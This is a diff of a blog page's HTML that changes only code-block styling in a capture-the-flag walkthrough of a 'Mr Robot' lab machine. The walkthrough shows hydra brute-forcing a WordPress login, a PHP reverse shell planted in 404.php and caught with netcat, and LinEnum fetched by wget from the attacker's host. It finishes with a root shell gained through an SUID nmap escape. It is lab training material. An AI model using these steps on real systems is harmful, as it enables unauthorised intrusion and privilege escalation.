-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sort fsocity.dic | uniq &gt; new_list.txt
-</span></span><span style="display:flex;"><span>cat new_list | wc -l
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11451</span>
-</span></span></code></pre></div><p>We have massively reduce our wordlist. Now let us find an endpoint to utilise the wordlist.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat fsocity.dic | wc -l
+<span style="color:#ae81ff">858160</span>
+</code></pre></div><p>There are a lot of lines and using sort we can see that there are also a lot of duplicates. So let us sort the list and remove all the duplicates and append the list in a new file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sort fsocity.dic | uniq &gt; new_list.txt
+cat new_list | wc -l
+<span style="color:#ae81ff">11451</span>
+</code></pre></div><p>We have massively reduce our wordlist. Now let us find an endpoint to utilise the wordlist.
 On our previous scan we have discovered that the site has a wordpress login. Let us try to login into the site using our wordlist.</p>
 <blockquote>
 <p>Wordpress has a default feature that if not disabled shows different error message for correct and incorrect username. If a user exists and if password is incorrect then it gives a hint that the password for the user is wrong. We can leverage this feature to enumerate for users and usernames that exist.</p>
@@ -301,16 +311,16 @@ On our previous scan we have discovered that the site has a wordpress login. Let
 The site probably doesn&rsquo;t have any rate limiting so we can bruteforce the correct username using a tool like burp intruder or hydra.
 Since I only have the community version of burp it would probably be too slow to find the username, so Hydra it is.</p>
 <p>Here is a good explanation of using Hydra for <a href="https://theblackthreat.medium.com/brute-force-login-using-hydra-4ad7ddf863f6">bruteforcing website</a>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; hydra -L new_list.txt -p password 10.10.103.189 http-post-form <span style="color:#e6db74">&#34;/wp-login.php:log=^USER^&amp;pwd=^PWD^:Invalid username&#34;</span> -t <span style="color:#ae81ff">30</span> -vV
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.103.189:80/wp-login.php:log<span style="color:#f92672">=</span>^USER^&amp;pwd<span style="color:#f92672">=</span>^PWD^:Invalid username
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> Resolving addresses ... <span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> resolving <span style="color:#66d9ef">done</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.103.189 - login <span style="color:#e6db74">&#34;Elliot&#34;</span> - pass <span style="color:#e6db74">&#34;password&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.103.189   login: Elliot   password: password
-</span></span></code></pre></div><p>From our hydra enumeration, we find the user <code>Elliot</code> after about going through 5000 lines of the wordlist.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; hydra -L new_list.txt -p password 10.10.103.189 http-post-form <span style="color:#e6db74">&#34;/wp-login.php:log=^USER^&amp;pwd=^PWD^:Invalid username&#34;</span> -t <span style="color:#ae81ff">30</span> -vV
+
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.103.189:80/wp-login.php:log<span style="color:#f92672">=</span>^USER^&amp;pwd<span style="color:#f92672">=</span>^PWD^:Invalid username
+<span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> Resolving addresses ... <span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> resolving <span style="color:#66d9ef">done</span>
+<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.103.189 - login <span style="color:#e6db74">&#34;Elliot&#34;</span> - pass <span style="color:#e6db74">&#34;password&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.103.189   login: Elliot   password: password
+</code></pre></div><p>From our hydra enumeration, we find the user <code>Elliot</code> after about going through 5000 lines of the wordlist.
 Now that we have the username, lets repeat the same process using our wordlist on the password field.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; hydra -l Elliot -P new_list.txt 10.10.103.189 http-post-form <span style="color:#e6db74">&#34;/wp-login.php:log=^USER^&amp;pwd=^PWD^:The password you&#34;</span> -t <span style="color:#ae81ff">30</span> -vV
-</span></span></code></pre></div><p>After going through about 5000 lines again we get a hit on the password, i.e <code>ER28–0652</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; hydra -l Elliot -P new_list.txt 10.10.103.189 http-post-form <span style="color:#e6db74">&#34;/wp-login.php:log=^USER^&amp;pwd=^PWD^:The password you&#34;</span> -t <span style="color:#ae81ff">30</span> -vV
+</code></pre></div><p>After going through about 5000 lines again we get a hit on the password, i.e <code>ER28–0652</code>.</p>
 <p>Now we login to the site using the wordpress credentials we enumerated.</p>
 <blockquote>
 <p>Our goal after getting access to the wordpress is to establish a shell so that we can access the system and obtain the keys. One way to gain a reverse shell is to change the php code of the 404.php page and insert code that will connect to our system.</p>
@@ -320,58 +330,60 @@ Now that we have the username, lets repeat the same process using our wordlist o
 <p>A snippet of what the <code>404.php</code> should look like:</p>
 <p><img src="/images/mrRobot/404php.png" alt="404php"></p>
 <p>Now update the 404.php page and start a netcat listener on your host system to wait for the connection from the shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; nc -lvnp <span style="color:#ae81ff">1337</span>
-</span></span><span style="display:flex;"><span>listening on 0.0.0.0 <span style="color:#ae81ff">1337</span>
-</span></span></code></pre></div><p>We can trigger the 404.php page by going to any non-existent page in the website.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; nc -lvnp <span style="color:#ae81ff">1337</span>
+listening on 0.0.0.0 <span style="color:#ae81ff">1337</span>
+</code></pre></div><p>We can trigger the 404.php page by going to any non-existent page in the website.
 Lets trigger the 404 by going to <code>http://10.10.103.189/errorpage</code></p>
 <blockquote>
 <p>We get a reverse connection to our netcat.</p>
 </blockquote>
 <p>Let us spawn a more stable shell using python.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span style="display:flex;"><span>daemon@linux: cd /home
-</span></span><span style="display:flex;"><span>daemon@linux: ls
-</span></span><span style="display:flex;"><span>daemon@linux: robot
-</span></span><span style="display:flex;"><span>daemon@linux: ls -l
-</span></span><span style="display:flex;"><span>ls -l
-</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
-</span></span><span style="display:flex;"><span>-r-------- <span style="color:#ae81ff">1</span> robot robot <span style="color:#ae81ff">33</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> key-2-of-3.txt
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> robot robot <span style="color:#ae81ff">39</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> password.raw-md5
-</span></span></code></pre></div><p>We can see the second key <code>key-2-of-3.txt</code> in the robots home directory but since our current user is daemon, and since only the robot user has read access to it and we can&rsquo;t view the contents of the file. We can also see a <code>password.raw-md5</code> file and on inspecting the file we can see that it contains a md5 hash and it can be deduced that it is the hash of the password for the user robot.  We probably have to decode the hash and login to robot user and then read the second key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+daemon@linux: cd /home
+daemon@linux: ls
+daemon@linux: robot
+daemon@linux: ls -l
+ls -l
+total <span style="color:#ae81ff">8</span>
+-r-------- <span style="color:#ae81ff">1</span> robot robot <span style="color:#ae81ff">33</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> key-2-of-3.txt
+-rw-r--r-- <span style="color:#ae81ff">1</span> robot robot <span style="color:#ae81ff">39</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> password.raw-md5
+</code></pre></div><p>We can see the second key <code>key-2-of-3.txt</code> in the robots home directory but since our current user is daemon, and since only the robot user has read access to it and we can&rsquo;t view the contents of the file. We can also see a <code>password.raw-md5</code> file and on inspecting the file we can see that it contains a md5 hash and it can be deduced that it is the hash of the password for the user robot.  We probably have to decode the hash and login to robot user and then read the second key.</p>
 <blockquote>
 <p>Instead, let us download <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">linEnum.sh</a> which is a shell script that can enumerate and detect interesting files that can lead to privilege escalation. This script can detect easy privilege escalation vectors like SUID and other misconfigured permissions etc.</p>
 </blockquote>
 <p>After downloading, let us start a python server on our localhost so that we can download the <code>LinEnum.sh</code> from our compromised shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">7575</span>
-</span></span></code></pre></div><p>Now on our reverse shell, let us move to the /tmp folder where we have read write access. Download the <code>linEnum.sh</code> from our python server and then set execute permission and then run the script.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>daemon@linux:/home/robot$ cd /tmp
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ wget http://10.17.30.241:7575/linEnum.sh
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ chmod +x linEnum.sh
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ./linEnum.sh
-</span></span></code></pre></div><p>Here is the output of <code>linEnum.sh</code> with an interesting discovery.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server <span style="color:#ae81ff">7575</span>
+
+</code></pre></div><p>Now on our reverse shell, let us move to the /tmp folder where we have read write access. Download the <code>linEnum.sh</code> from our python server and then set execute permission and then run the script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@linux:/home/robot$ cd /tmp
+daemon@linux:/home/robot$ wget http://10.17.30.241:7575/linEnum.sh
+daemon@linux:/home/robot$ chmod +x linEnum.sh
+daemon@linux:/home/robot$ ./linEnum.sh
+
+</code></pre></div><p>Here is the output of <code>linEnum.sh</code> with an interesting discovery.</p>
 <p><img src="/images/mrRobot/linEnum.png" alt="linEnum"></p>
 <p>We can observe that the script found a possible SUID file in <code>/usr/local/bin/nmap</code>. Let us try to gain root privilege using this file.</p>
 <p>We can refer to <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins/nmap</a> to try to execute shell commands.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>daemon@linux:/tmp$ /usr/local/bin/nmap --interactive
-</span></span><span style="display:flex;"><span>/usr/local/bin/nmap --interactive
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Starting nmap V. 3.81 <span style="color:#f92672">(</span> http://www.insecure.org/nmap/ <span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
-</span></span><span style="display:flex;"><span>nmap&gt; !sh
-</span></span><span style="display:flex;"><span>!sh
-</span></span><span style="display:flex;"><span>&gt; whoami
-</span></span><span style="display:flex;"><span>root
-</span></span></code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@linux:/tmp$ /usr/local/bin/nmap --interactive
+/usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 <span style="color:#f92672">(</span> http://www.insecure.org/nmap/ <span style="color:#f92672">)</span>
+Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
+nmap&gt; !sh
+!sh
+&gt; whoami
+root
+</code></pre></div><blockquote>
 <p>Voila! We now have root access to the server and can read the contents of any file.</p>
 </blockquote>
 <p>After gaining root access, we can easily view the contents of both the keys.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>daemon@linux:/tmp$ cd /home/robot
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ cat key-2-of-3.txt
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ *******************
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ cd /root
-</span></span><span style="display:flex;"><span>daemon@linux:/root$ cat key-3-of-3.txt
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ *******************
-</span></span></code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@linux:/tmp$ cd /home/robot
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+daemon@linux:/home/robot$ *******************
+daemon@linux:/home/robot$ cd /root
+daemon@linux:/root$ cat key-3-of-3.txt
+daemon@linux:/home/robot$ *******************
+</code></pre></div><blockquote>
 <p>That&rsquo;s it. Happy Hacking</p>
 </blockquote>
 
